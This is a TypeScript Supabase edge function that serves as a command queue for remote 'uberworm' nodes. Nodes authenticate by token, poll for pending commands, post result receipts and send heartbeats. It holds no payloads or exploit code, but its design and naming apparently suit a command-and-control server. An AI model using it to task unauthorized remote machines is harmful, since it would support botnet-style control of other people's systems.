import { createClient } from "npm:@supabase/supabase-js@2.116.0";

const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), {
  status,
  headers: { "content-type": "application/json; charset=utf-8", "cache-control": "no-store" }
});

async function sha256Hex(value: string) {
  const bytes = new TextEncoder().encode(value);
  const hash = await crypto.subtle.digest("SHA-256", bytes);
  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
}

Deno.serve(async (req: Request) => {
  if (req.method !== "POST") return json({ ok: false, error: "method-not-allowed" }, 405);

  const nodeId = (req.headers.get("x-uberworm-node") || "").trim();
  const token = (req.headers.get("x-uberworm-token") || "").trim();
  if (!nodeId || token.length < 32 || token.length > 256) return json({ ok: false, error: "node-auth-required" }, 401);

  const url = Deno.env.get("SUPABASE_URL");
  const serviceRole = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  if (!url || !serviceRole) return json({ ok: false, error: "server-auth-unavailable" }, 503);

  const admin = createClient(url, serviceRole, {
    auth: { persistSession: false, autoRefreshToken: false, detectSessionInUrl: false }
  });

  const tokenHash = await sha256Hex(token);
  const { data: node, error: nodeError } = await admin
    .from("uberworm_nodes")
    .select("node_id, enabled")
    .eq("node_id", nodeId)
    .eq("token_hash", tokenHash)
    .maybeSingle();

  if (nodeError) return json({ ok: false, error: "node-auth-query-failed" }, 500);
  if (!node?.enabled) return json({ ok: false, error: "node-auth-rejected" }, 401);

  const now = new Date().toISOString();
  await admin.from("uberworm_nodes").update({ last_seen_at: now }).eq("node_id", nodeId);

  let body: any;
  try { body = await req.json(); } catch { return json({ ok: false, error: "invalid-json" }, 400); }
  const op = String(body?.op || "");

  if (op === "poll") {
    await admin.from("uberworm_commands")
      .update({ status: "expired", completed_at: now })
      .eq("node_id", nodeId)
      .eq("status", "pending")
      .lte("expires_at", now);

    const { data: pending, error: pendingError } = await admin
      .from("uberworm_commands")
      .select("id, action, args, expires_at, created_at")
      .eq("node_id", nodeId)
      .eq("status", "pending")
      .gt("expires_at", now)
      .order("created_at", { ascending: true })
      .limit(1)
      .maybeSingle();

    if (pendingError) return json({ ok: false, error: "poll-query-failed" }, 500);
    if (!pending) return json({ ok: true, command: null });

    const { data: claimed, error: claimError } = await admin
      .from("uberworm_commands")
      .update({ status: "running", claimed_at: now })
      .eq("id", pending.id)
      .eq("node_id", nodeId)
      .eq("status", "pending")
      .select("id, action, args, expires_at, created_at")
      .maybeSingle();

    if (claimError) return json({ ok: false, error: "claim-failed" }, 500);
    return json({ ok: true, command: claimed || null });
  }

  if (op === "receipt") {
    const commandId = String(body?.commandId || "").trim();
    const ok = body?.ok === true;
    const payload = body?.payload && typeof body.payload === "object" ? body.payload : {};
    if (!/^[0-9a-f-]{36}$/i.test(commandId)) return json({ ok: false, error: "valid-command-id-required" }, 400);

    const { data: command, error: commandError } = await admin
      .from("uberworm_commands")
      .select("id, node_id, status")
      .eq("id", commandId)
      .eq("node_id", nodeId)
      .maybeSingle();

    if (commandError) return json({ ok: false, error: "receipt-command-query-failed" }, 500);
    if (!command) return json({ ok: false, error: "command-not-found" }, 404);
    if (!["running", "done", "failed"].includes(command.status)) return json({ ok: false, error: "command-not-claimable-for-receipt" }, 409);

    const { error: receiptError } = await admin
      .from("uberworm_receipts")
      .upsert({ command_id: commandId, node_id: nodeId, ok, payload }, { onConflict: "command_id" });

    if (receiptError) return json({ ok: false, error: "receipt-write-failed" }, 500);

    await admin.from("uberworm_commands")
      .update({ status: ok ? "done" : "failed", completed_at: now })
      .eq("id", commandId)
      .eq("node_id", nodeId);

    return json({ ok: true });
  }

  if (op === "heartbeat") return json({ ok: true, node: nodeId, at: now });

  return json({ ok: false, error: "unsupported-op" }, 400);
});
